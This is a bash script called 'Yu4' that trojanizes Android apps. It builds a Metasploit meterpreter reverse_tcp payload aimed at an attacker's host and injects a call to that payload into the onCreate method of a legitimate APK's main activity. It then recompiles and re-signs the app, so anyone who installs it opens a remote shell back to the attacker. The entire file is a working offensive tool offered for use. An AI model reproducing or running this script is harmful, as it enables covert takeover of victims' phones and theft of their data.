#! /bin/bash
# Tool name : Yu4
# Developers : [Hex]5A65726F4F6E6573
# Author Company : Orserg open source network Arsenal
# Weapon warehouse entity number: OAMSPT-0001
# Project Community : https://t.me/zeroones0yu4  （TG）
# Type ：Mobile security (Android) smali code injection tool
# Tested on: Fedora Linux


#One Start Yu4

echo -e "\033[33m	        _   _       _  _    \033[1m"
echo -e "\033[33m	  _   _| | | |     | || |   \033[1m"
echo -e "\033[33m	 | | | | | | |_____| || |_  \033[1m"
echo -e "\033[33m	 | |_| | |_| |_____|__   _| \033[1m"
echo -e "\033[33m	  \__, |\___/         |_|   \033[1m"
echo -e "\033[33m	  |___/  \033[1m" "\033[32m  [Hex]5A65726F4F6E6573[+]\033[0m"
echo "        Apk Mali Samli Code"
echo "		 Injection Tool"
echo ""
echo -e "\033[34m[I]:\033[0m" Currently, only code protected APK file injection with onCreate method as the entry is supported   ⚡⚡⚡⚡ [Info]
echo -e "\033[34m[I]:\033[0m" https://t.me/zeroones0yu4 🚀🚀🚀🚀[TG]
#Malicious SmalI code generation(MSCG)
#yu4-MSCG
echo -n -e "\033[32m[*]: \033[0m"  
read -p "Please Enter LHOST : " LHOST
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST -f raw -o payload.apk
java -jar apktool.jar d payload.apk -o payload
cp -R payload/smali/com/metasploit/ metasploit
rm -R payload && rm payload.apk

#Unpacksss
#yu4-Unpack
ls
echo ""
echo -n -e "\033[32m[*]: \033[0m"  
read -p "Please enter the absolute path of the APK file : " Apk_Path
java -jar apktool.jar d $Apk_Path -o A1

#Locate the main startup activity
#yu4-LMAS
echo -n -e "\033[31m[!]: \033[0m"
echo "Please find the name of the main startup activity"
echo ""
echo -n -e "\033[32m[AndroidManifest.xml-RAW] \033[0m"  
echo ""
echo "--------------------------------------------------------------------------------------------------------------------"
cat -n A1/AndroidManifest.xml | grep MAIN  -B10
echo "--------------------------------------------------------------------------------------------------------------------"

#Locate the main startup activity SmalI code Path and Locate the oncreate startup entry in the main startup activity SmalI code
echo -n -e "\033[31m[!]: \033[0m"
read -p "Please enter the name of the main startup activity : " main_startup_activity
v0=`find -name $main_startup_activity.smali` 
echo ""
echo -e "\033[32m[$v0-RAW] \033[0m"
echo "--------------------------------------------------------------------------------------------------------------------"
cat -n $v0 | grep "onCreate"  -A10
echo "--------------------------------------------------------------------------------------------------------------------"

#Inject SmalI shellcode into the specified path
echo -e "\033[31m[!]: Please enter the number of lines of startup entry code\033[0m"
echo ""
read -p "Manually execute the command : " Number
v1=a
v2=$Number$v1
sed -i ''$v2' invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $v0
echo -e "\033[32m[$v0-RAW] \033[0m"
echo "--------------------------------------------------------------------------------------------------------------------"
cat -n $v0 | grep "onCreate"  -A10
echo "--------------------------------------------------------------------------------------------------------------------"
echo ""
echo -n -e "\033[31m[!]: \033[0m"
read -p "Please enter Malicious SmalI code injection path : " SmalI_shellcode_injection_path
cp -R metasploit/ $SmalI_shellcode_injection_path

ls $SmalI_shellcode_injection_path
echo ""
echo ""
#Recompile apk
java -jar apktool.jar  b A1 -o a1.apk
jarsigner -verbose -keystore test.keystore -signedjar a2.apk a1.apk test.keystore
echo ""
echo -e "\033[31m[!]: The APK name will be displayed after the injection is successful\033[0m"
echo "--------------------------------------------------------------------------------------------------------------------"
ls | grep 'a2.apk'
echo "--------------------------------------------------------------------------------------------------------------------"
rm -R metasploit/ && rm -R A1/ && rm a1.apk
